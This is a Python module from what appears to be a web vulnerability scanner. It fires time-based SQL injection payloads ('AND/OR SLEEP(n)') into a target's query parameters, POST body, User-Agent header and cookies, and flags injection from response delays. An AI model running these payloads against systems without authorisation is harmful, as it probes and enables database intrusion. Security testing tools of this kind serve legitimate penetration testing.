from src.http_handler import HTTPHandler
from src.sqli_scanner import SQLiScanner
from src.print_handler import PrintHandler

START_DELAY_TIME = 10 # initial delay time
MAX_DELAY_TIME = 25 # max delay time
DELAY_DELTA = 5 # seconds to increment delay time per test case
DELAY_ERROR = 3 # maximum "overhead" until we deem no injection

payloads = [
    "' AND SLEEP(_TIME_VALUE_); -- ",
    "' OR SLEEP(_TIME_VALUE_); -- ",
    '" AND SLEEP(_TIME_VALUE_); -- ',
    '" OR SLEEP(_TIME_VALUE_); -- ',

    " AND SLEEP(_TIME_VALUE_); -- ",
    " OR SLEEP(_TIME_VALUE_); -- "
]

class TimeBasedScan(SQLiScanner):    
    def query_scan(self, target):
        """
        Scans URL query parameters for time-based SQL injection vulnerabilities.

        Parameters:
            target: The HTTP target object containing URL, query parameters, etc.
        """
        target.get_parsed_url()
        target.get_query_parameters()

        for query_param in target.query_params:
            for payload in payloads:

                # assume target is vulnerable, unless response is faster than delay time
                is_vulnerable = True
                for delay_time in range(START_DELAY_TIME, MAX_DELAY_TIME, DELAY_DELTA):

                    # insert delay time into payload
                    current_payload = payload.replace("_TIME_VALUE_", str(delay_time))

                    # inject query_param with payload
                    injected_url = self._inject_query(target.url, query_param, current_payload)
                    
                    # send malicious request
                    response = HTTPHandler.send_request(url=injected_url, method="get", timeout=delay_time+DELAY_ERROR)
                    if response == None:
                        is_vulnerable = False
                        break

                    # if elapsed time < delay_time, then we likely don't have an injection
                    # similarly, if elapsed time > delay_time + delta error, it is likely no injection exists
                    elapsed_time = response.elapsed.total_seconds()
                    if elapsed_time < delay_time or elapsed_time > delay_time+DELAY_ERROR:
                        is_vulnerable = False
                        break

                # if payload passed all tests, then we assume target is vulnerable
                if is_vulnerable:
                    PrintHandler.print_message("Query ~ Time-Based SQL Injection Detected!", "DETECTION", "green")
                    self._log_injection(
                        target=target,
                        vuln_param=query_param,
                        payload=payload,
                        inject_type="query",
                        inject_method="time"
                    )
                    return

    def body_scan(self, target):
        """
        Scans POST request body parameters for time-based SQL injection vulnerabilities.

        Parameters:
            target: The HTTP target object containing URL, body parameters, etc.
        """
        if target.body:
            for param, _ in target.body.items():
                for payload in payloads:

                    # assume target is vulnerable, unless response is faster than delay time
                    is_vulnerable = True
                    for delay_time in range(START_DELAY_TIME, MAX_DELAY_TIME, DELAY_DELTA):

                        # insert delay time into payload
                        current_payload = payload.replace("_TIME_VALUE_", str(delay_time))

                        # inject body param with payload
                        injected_body = self._inject_body(target.body, param, current_payload)
                        
                        # send malicious request
                        response = HTTPHandler.send_request(url=target.url, body=injected_body, method="post", timeout=delay_time+DELAY_ERROR)
                        if response == None:
                            is_vulnerable = False
                            break              

                        # if elapsed time < delay_time, then we likely don't have an injection
                        # similarly, if elapsed time > delay_time + delta error, it is likely no injection exists
                        elapsed_time = response.elapsed.total_seconds()
                        if elapsed_time < delay_time or elapsed_time > delay_time+DELAY_ERROR:
                            is_vulnerable = False
                            break

                    # if payload passed all tests, then we assume target is vulnerable
                    if is_vulnerable:
                        PrintHandler.print_message("Body ~ Time-Based SQL Injection Detected!", "DETECTION", "green")
                        self._log_injection(
                            target=target,
                            vuln_param=param,
                            payload=payload,
                            inject_type="body",
                            inject_method="time"
                        )
                        return

    def header_scan(self, target):
        """
        Scans HTTP headers for time-based SQL injection vulnerabilities.

        Parameters:
            target: The HTTP target object containing URL, headers, etc.
        """
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }
    
        for header, value in headers.items():
            for payload in payloads:
            
                # assume target is vulnerable, unless response is faster than delay time
                is_vulnerable = True
                for delay_time in range(START_DELAY_TIME, MAX_DELAY_TIME, DELAY_DELTA):

                    # insert delay time into payload
                    current_payload = payload.replace("_TIME_VALUE_", str(delay_time))

                    # inject payload into header
                    injected_headers = self._inject_header(headers, header, current_payload)
                    
                    # send malicious request
                    response = None
                    if target.body:
                        response = HTTPHandler.send_request(url=target.url, body=target.body, headers=injected_headers, method="post", timeout=delay_time+DELAY_ERROR)
                    else:
                        response = HTTPHandler.send_request(url=target.url, headers=injected_headers, method="get", timeout=delay_time+DELAY_ERROR)
                    if response == None:
                        is_vulnerable = False
                        break

                    # if elapsed time < delay_time, then we likely don't have an injection
                    # similarly, if elapsed time > delay_time + delta error, it is likely no injection exists
                    elapsed_time = response.elapsed.total_seconds()
                    if elapsed_time < delay_time or elapsed_time > delay_time+DELAY_ERROR:
                        is_vulnerable = False
                        break

                # if payload passed all tests, then we assume target is vulnerable
                if is_vulnerable:
                    PrintHandler.print_message("Header ~ Time-Based SQL Injection Detected!", "DETECTION", "green")
                    self._log_injection(
                        target=target,
                        vuln_param=header,
                        headers=headers,
                        payload=payload,
                        inject_type="header",
                        inject_method="time"
                    )
                    return

    def cookie_scan(self, target):
        """
        Scans cookies for time-based SQL injection vulnerabilities.

        Parameters:
            target: The HTTP target object containing URL, cookies, etc.
        """
        cookies = target.get_cookies()
    
        for cookie, _ in cookies.items():
            for payload in payloads:
            
                # assume target is vulnerable, unless response is faster than delay time
                is_vulnerable = True
                for delay_time in range(START_DELAY_TIME, MAX_DELAY_TIME, DELAY_DELTA):

                    # insert delay time into payload
                    current_payload = payload.replace("_TIME_VALUE_", str(delay_time))

                    # inject payload into cookie
                    injected_cookies = self._inject_cookie(cookies, cookie, current_payload)
                    
                    # send malicious request
                    response = None
                    if target.body:
                        response = HTTPHandler.send_request(url=target.url, body=target.body, cookies=injected_cookies, method="post", timeout=delay_time+DELAY_ERROR)
                    else:
                        response = HTTPHandler.send_request(url=target.url, cookies=injected_cookies, method="get", timeout=delay_time+DELAY_ERROR)
                    if response == None:
                        is_vulnerable = False
                        break

                    # if elapsed time < delay_time, then we likely don't have an injection
                    # similarly, if elapsed time > delay_time + delta error, it is likely no injection exists
                    elapsed_time = response.elapsed.total_seconds()
                    if elapsed_time < delay_time or elapsed_time > delay_time+DELAY_ERROR:
                        is_vulnerable = False
                        break

                # if payload passed all "test cases", then we assume target is vulnerable
                if is_vulnerable:
                    PrintHandler.print_message("Cookie ~ Time-Based SQL Injection Detected!", "DETECTION", "green")
                    self._log_injection(
                        target=target,
                        vuln_param=cookie,
                        cookies=cookies,
                        payload=payload,
                        inject_type="cookie",
                        inject_method="time"
                    )
                    return

    def detect_false_positive(self, target):
        """
        Detects potential false positives by verifying unmodified requests.

        The method has basically been implemented during the scanning phase.
        
        Parameters:
            target: The HTTP target object.
        
        Returns:
            bool: False, as the method is effectively implemented during the scan.
        """
        return False # this is effectively already implemented
